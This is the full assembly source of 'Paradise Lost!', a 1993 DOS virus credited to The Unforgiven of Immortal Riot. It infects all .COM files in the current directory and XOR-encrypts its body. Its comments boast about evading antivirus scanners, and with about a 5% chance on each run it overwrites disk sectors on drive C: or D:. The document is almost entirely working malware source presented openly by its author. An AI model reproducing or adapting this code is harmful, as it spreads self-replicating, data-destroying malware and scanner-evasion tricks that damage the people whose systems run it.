; VirusName : PARADISE LOST!
; Origin    : Sweden
; Author    : The Unforgiven
; Date      : 20/12/93

; This is a "mutation", of Tormentor's .COM lession. I've modified
; some stuffs, but since I liked the .EXE infector better, I didn't
; cared too much about this one. 

; Anyway, this is a non-resident current directory (yuck!), infector
; of .COM programs. It've added a encryption routine, but it's nothing
; really to scream hurray for.

; It's also a bit destructive, well, it's 5% chance at each run, that
; one of drive c: or d: gets kinda phucked up. This routine was as
; usual "stolen" from Nowhere Man of NuKE. I must admit I like it!

; Scan/MSAV/CPAV and F-prot can't find as usual find shits! I think
; that ThunderByte AntiVirus heurtistic scanner found the infected
; files as "probably/possible" infected, I really dunno, you try it
; out by your self!

; "We do not live forever, but mind never leaves our souls." (Dark Image).

;=============================================================================
;                          **** PARADISE LOST! ****
;=============================================================================

		.model  tiny
		.radix  16
		.code

Virus_Lenght    EQU     Virus_End-Virus_Start   ; Lenght of virus.

		org     100

dummy_code:     db      'M'             ; Mark file as infected.
		db      3 DUP(90)       ; This is to simulate a infected prog.
					; Not included in virus-code.

Virus_Start:     call   where_we_are    ; Now we call the next bytes, just to

; F-prot founded the 'lession -1'virus here in the unencrypted area, but by
; simple add the push si, and the extra pop, it compleatele screwed up, and
; couldn't found it as nothing!, HA! Eat dust, looser!

where_we_are:    push   si
		 pop    si              ; Since the virus-code's address will
		 pop    si

;-----------------------------------------------------------------------
; Now we have to put back the original 4 bytes in the host program, so 
; we can return control to it later:
		add     si,_4first_bytes-where_we_are
		mov     di,100
		cld
		movsw
		movsw
;------------------------------------------------------------------------
; We have to use SI as a reference since files differ in size thus making
; virus to be located at different addresses.

		sub     si,_4first_bytes-Virus_Start+4

 call encrypt_decrypt                   ; differ from victim to victim.
 jmp encryption_start                   ; a POP SI after a call will give us the
					; address which equals to 'where_we_are'
					; Very important.
 write_virus:
 call encrypt_decrypt
		mov     ah,40           ; Append file with virus code.
		mov     cx,offset Virus_Lenght
		mov     dx,si           ; Virus_Lenght.
		int     21      
 call encrypt_decrypt
 ret

 encryption_value dw 0
 encrypt_decrypt:

  mov di,offset encryption_start-virus_start 
  add di,si                             
  mov cx,(end_of_encryption-encryption_start+1)/2  

 push bx
 mov bx,offset encryption_value-virus_start
 add bx,si
 mov dx,word ptr [bx]
 pop bx

 again:
      xor word ptr cs:[di],dx
      add di,2
      loop again
      ret
;------------------------------------------------------------------------
; Now we just have to find victims, we will look for ALL .COM files in
; the current directory.

encryption_start:
;set_dta:
mov ah,1ah
lea dx,[si+offset dta-virus_start]
int 21h
		mov     ah,4e           ; We start to look for a *.COM file
look4victim:    mov     dx,offset file_match-Virus_Start
		add     dx,si
		int     21      

		jc      no_victim_found

; clear attribs: before open file
    mov ax,4301h
    xor cx,cx
    lea dx,[si+virus_end+1eh]
    int 21h
		mov     ax,3d02         ; Now we open the file.
		lea     dx,[si+offset DTA-virus_start+1eh] ;now also including
		int     21              ; DTA.
		jc      cant_open_file  ; If file couldn't be open.
	
		xchg    ax,bx           ; Save filehandle in bx
; (we could use MOV BX,AX but we saves one byte by using xchg )
	
		mov     ah,3f           ; Now we read the first 4 bytes
		mov     cx,4            ; from the victim -> buffer

		mov     dx,offset _4first_bytes-Virus_Start
		add     dx,si
					; We will then overwrite them with
		int     21              ; a JMP XXXX to virus-code at end.
	
		jc      read_error

		cmp     byte ptr ds:[si+_4first_bytes-Virus_Start],'M'
		jz      sick_or_EXE     ; Check if infected OR *.EXE 

; Almost all EXE files starts with 'M' and we mark the infected files by
; starting with 'M' which equals to DEC BP 
; Now we just have to have one check instead of 2 (infected and *.EXE)

		mov     ax,4202         ; Position file-pointer to point at 
		xor     cx,cx           ; End-of-File.
		xor     dx,dx           ; Any writing to file will now APPEND it
		int     21              ; Returns AX -> at end.

		sub     ax,4            ; Just for the JMP structure.

		mov     word ptr ds:[_4new_bytes+2],ax
					; Build new JMP XXXX to virus.
					; ( logic: JMP AX )

 mov word ptr [si+encryption_value-virus_start],99 ; encryption_value.
 call write_virus       

;
;               mov     ah,40           ; Append file with virus code.
;               mov     cx,offset Virus_Lenght
;               mov     dx,si           ; Virus_Lenght.
;               int     21      
;               jc      write_error


		mov     ax,4200         ; Position file-pointer to begin of file
		xor     cx,cx           ; So we can change the first 3 bytes
		xor     dx,dx           ; to JMP to virus.
		int     21      

		mov     ah,40           ; Write new 3 bytes.
		mov     cx,4            ; After this, executing the file will
		mov     dx,offset _4new_bytes-Virus_Start
		add     dx,si
					; result in virus-code executing before
		int     21              ; original code.
		jc      write_error

; then close the file.
		mov     ah,3e           ; Close file, now file is infected.
		int     21              ; Dos function 3E (close handle)

Sick_or_EXE:    mov     ah,4f           ; Well, file is infected. Now let's
		jmp     look4victim     ; find another victim...

write_error:            ; Here you can test whats went wrong.
read_error:             ; This is just for debugging purpose.
cant_open_file:         ; These entries are equal to eachother
no_victim_found:        ; but could be changed if you need to test something.

; randomize:
    mov ah,2ch                              ;get a new random number
    int 21h                                 ;5% chance of nuke
    cmp dl,5
    ja real_quit                            
    jmp which

which:
mov ah,2ch
int 21h
cmp dl,50
ja  nuke_c
jmp nuke_d

nuke_c:
	cli                             ;      
	mov     ah,2                    ; 2=c:
	cwd                             ; 
	mov     cx,0100h                ; 
	int     026h                    ; 
	JMP     REAL_QUIT

nuke_d:
	cli
	mov     ah,3                    ; 3=d:
	cwd
	mov     cx,0100h
	int     026h
	jmp     real_quit

real_quit:                              
		mov     ax,100          ; Every thing is put back in memory,
		push    ax              ; lets us RET back to start of program
		ret                     ; and execute the original program.

notes           db '[PARADIS LOST!] (c) 93 The Unforgiven/Immortal Riot'
file_match      db '*.COM',0                ; Pattern to search for.

end_of_encryption:
_4first_bytes:  ret                     ; Here we save the 4 first org. bytes
		db      3 DUP(0)
; We have a ret here since this file isn't a REAL infection.

_4new_bytes     db      'M',0E9, 00, 00 ; Here we build the 4 new org. bytes
datestamp       equ     24              ;  Offset in DTA of file's date stamp
timestamp       equ     22              ;  Offset in DTA of file's time stamp
filename        equ     30              ;  Offset in DTA of ASCIIZ filename
attribute       equ     21              ;  Offset in DTA of file attribute


					; so our virus-code will be run first.
Virus_End       EQU     $
dta             db      42 DUP (?)
		end     dummy_code
